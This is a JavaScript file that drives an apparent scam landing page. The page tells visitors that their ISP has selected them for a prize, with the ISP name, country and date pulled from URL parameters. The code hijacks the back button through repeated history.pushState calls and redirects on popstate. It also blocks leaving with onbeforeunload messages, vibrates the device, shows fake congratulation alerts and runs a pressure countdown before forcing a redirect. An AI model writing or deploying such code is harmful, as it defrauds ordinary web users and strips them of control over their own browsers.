/*setTimeout(function () {
   window.onbeforeunload = null;
   window.location.href = url;
}, 30000);*/

!function () { 
var t; 
try { 
for (t = 0; 10 > t; ++t) history.pushState({}, "", "#"); 
onpopstate = function (t) { 
t.state && location.replace(url)
} 
} catch (o) {}
}();

try {
	navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
	navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
} catch(o) {}

function getURLParameter(c) {
	if(obj[c] != undefined) {
		return obj[c];
	}
	return '';
}

function get_text(id) {
	if(translations_js[id] != undefined) {
		return translations_js[id];
	}
	else {
		return id;
	}
}

var product_name = capitalize(getURLParameter('product'));
var isp = capitalize(getURLParameter('isp'));
var country = capitalize(getURLParameter('country'));
  
var param = {
	"date":    	new Array(get_text("Sunday"), get_text("Monday"), get_text("Tuesday"), get_text("Wednesday"), get_text("Thursday"), get_text("Friday"), get_text("Saturday")),
	"month":   	new Array(get_text("January"), get_text("February"), get_text("March"), get_text("April"), get_text("May"), get_text("June"), get_text("July"), get_text("August"), get_text("September"), get_text("October"), get_text("November"), get_text("December"))
};

function capitalize(input) {
	if(input.length > 0) {
		var words = input.split(' ');  
		var CapitalizedWords = [];  
		words.forEach(element => {  
			CapitalizedWords.push(element[0].toUpperCase() + element.slice(1, element.length));  
		});  
		return CapitalizedWords.join(' ');
	}
	else {
		return input;
	}
} 

!(function (o, m, q, e) {
	o._ = { btn: ["#4285F4", "#fff"] };
	for (var n = q.search.substr(1).split("&"), l = 0; l < n.length; l++) {
		var r = n[l].split("=", 2);
		_[r[0]] = decodeURI(r[1]);
	}
	_.isp = "";
	_.ip = "";
	_.entry = 1;
	_.audio = 1;
	_.instructions = 1;
	_.region = "";
	var p = m.createElement("style");
	(o.d = function (a) {
		var c = new Date(e + 86400000 * (a || 0)),
			b = param["date"][c.getDay()],
			f = param["month"][c.getMonth()];
		return b + " " + c.getDate() + ", " + f + " " + c.getFullYear();
	}),
		(o.w = function (a) {
			m.write(a || "");
		});
})(window, document, location, +new Date());

function contains(c, e) {
	c = c.toLowerCase();
	e = e.toLowerCase();
	return c.indexOf(e) !== -1;
}   

!(function (n, h, m, e, l) {
	!(function n(c, g, b) {
		function f(s, r) {
			if (!g[s]) {
				if (!c[s]) {
					var p = "function" == typeof require && require;
					if (!r && p) {
						return p(s, !0);
					}
					if (a) {
						return a(s, !0);
					}
					var u = new Error("Cannot find module '" + s + "'");
					throw ((u.code = "MODULE_NOT_FOUND"), u);
				}
				var t = (g[s] = { exports: {} });
				c[s][0].call(
					t.exports,
					function (v) {
						var q = c[s][1][v];
						return f(q ? q : v);
					},
					t,
					t.exports,
					n,
					c,
					g,
					b
				);
			}
			return g[s].exports;
		}
		for (var a = "function" == typeof require && require, o = 0; o < b.length; o++) {
			f(b[o]);
		}
		return f;
	})(
		{
			1: [
				function (g, c, f) {
					var b = (g("js/prototype"), g("js/querystring")),
						o = g("js/date")({}),
						a = (g("js/go"), g("js/backbutton")(m.href), g("js/fx"));
					if (
						((n._ = b.parse(m.search.substr(1))),
						(n.date = new o(_.country || "")),
						(n.go = function (q) {
							alert(translations_js["your_place_has_been_reserved_text"]), (n.onbeforeunload = null), m.replace(url);
						}),
						(n.next = function (q) {
							q.onclick = null;
							var r = function q(s) {
								setTimeout(function () {
									a.fadeOut(s, {
										complete: function (t) {
											var u = t.nextSibling;
											a.fadeIn(t.nextSibling),
												"done" !== u.id
													? q(u)
													: setInterval(function () {
														  var w = h.getElementById("timer");
														  (time = w.innerText.split(":")), (time = 60 * time[0] + parseInt(time[1])), 1 === time && go(1);
														  var v = Math.floor(--time / 60),
															  y = ("0" + (time % 60)).substr(-2);
														  w.innerText = v + ":" + y;
													  }, 1000);
										},
									});
								}, 1500);
							};
							a.fadeOut(q.parentNode, {
								complete: function (s) {
									var t = s.nextSibling;
									a.fadeIn(t), "loading" === t.id && r(t);
								},
							});
						}),
						(_.logo = '<img src="cadeau.png">'),
						"carrier" in _ && _.carrier.length >= 5 && (_.isp = _.carrier),
						"isp" in _)
					) {
						var p = _.isp;
						p !== _.isp && (h.documentElement.className = _.isp.split(" ")[0].toLowerCase());
					}
					setTimeout(function () {
						alert(translations_js['CONGRATULATIONS!_we_want_to_thank_you_text'].replace('%DATE_TEXT_JS%', d()).replace('%ISP_TEXT_JS%', getURLParameter('isp')));
					}, 0),
						(n.onbeforeunload = function () {
							return translations_js['Wait!_your_ip_address_has_been_selected_for_a_chance_text'];
						});
				},
				{ "js/backbutton": 2, "js/date": 3, "js/fx": 4, "js/go": 5, "js/prototype": 6, "js/querystring": 7 },
			],
			2: [
				function (c, b, a) {
					b.exports = function (f) {
						try {
							k.replaceState({}, "", i.href + "#/!"),
								k.pushState({}, "", i.href.replace(/#.+$/, "")),
								(g.onpopstate = function (p) {
									"#/!" === i.hash &&
										setTimeout(function () {
											if ("string" == typeof f) {
												return i.replace(f);
											}
											go(f);
										}, 100);
								});
						} catch (g) {}
					};
				},
				{},
			],
			3: [
				function (c, b, a) {
					b.exports = function (f) {
						return function (g) {
							return function (r) {
								var p = f.format[g] || "";
								return (r = r || new Date()), (p = p.replace("%D", f.days[r.getDay()])), (p = p.replace("%M", f.months[r.getMonth()])), (p = p.replace("%d", r.getDate())), (p = p.replace("%Y", r.getFullYear()));
							};
						};
					};
				},
				{},
			],
			4: [
				function (c, b, a) {
					b.exports = {
						animate: function (g, q) {
							q.duration = q.duration || 300;
							var r = new Date(),
								f = setInterval(function () {
									var p = new Date() - r,
										o = p / q.duration;
									o > 1 && (o = 1), q.step(o), 1 === o && (clearInterval(f), q.complete && q.complete(g));
								}, q.delay || 10);
						},
						fadeIn: function (g, f) {
							console.log(g);
							var p = g.style;
							(f = f || {}),
								(p.opacity = 0),
								g.removeAttribute("hidden"),
								(f.step = function (o) {
									p.opacity = o;
								}),
								this.animate(g, f);
						},
						fadeOut: function (g, f) {
							var p = g.style;
							(f = f || {}),
								(p.opacity = 1),
								(f.step = function (o) {
									(p.opacity = 1 - o), 1 === o && g.setAttribute("hidden", "hidden");
								}),
								this.animate(g, f);
						},
					};
				},
				{},
			],
			5: [
				function (b, a, c) {
					a.exports = function (f) {
						return function (p, g) {
							void 0 === f && (f = ""), void 0 !== g && alert(g), (j.onbeforeunload = null), j.open("");
						};
					};
				},
				{},
			],
			6: [
				function (c, b, a) {
					String.prototype.capitalize = function () {
						return this.charAt(0).toUpperCase() + this.substr(1);
					};
				},
				{},
			],
			7: [
				function (c, b, a) {
					b.exports = {
						parse: function (q) {
							var s = {},
								y = q.split("&"),
								g = decodeURIComponent;
							if (q.length < 1) {
								return s;
							}
							for (var p = 0; p < y.length; p++) {
								var u = y[p].split("=", 1)[0],
									f = g(y[p].substr(u.length + 1));
								s[g(u)] = f;
							}
							return s;
						},
						stringify: function (g) {
							var f = [];
							return (
								Object.keys(g).forEach(function (p) {
									return f.push(p + "=" + g[p]);
								}),
								f.join("&")
							);
						},
					};
				},
				{},
			],
		},
		{},
		[1]
	);
	document.getElementById("today").innerHTML = d();
	document.getElementById("country").innerHTML = getURLParameter("country");
	document.getElementById("isp").innerHTML = getURLParameter("isp");
	var x = document.getElementsByClassName("isp"), i;
	for(i in x) {
		x[i].innerHTML = getURLParameter("isp");
	}
})(window, document, location, history, navigator);

function launchpopLink(a) {
	try {
		a = a || window.event;
		if (a.preventDefault) {
			a.preventDefault();
			a.stopPropagation();
		} else {
			a.cancelBubble = true;
			a.returnValue = false;
		}
	} catch (b) {}
	window.onbeforeunload = null;
	window.location.replace(url);
	return false;
}

function exit_a1() {
	(window.onbeforeunload = null), (window.location = url);
}
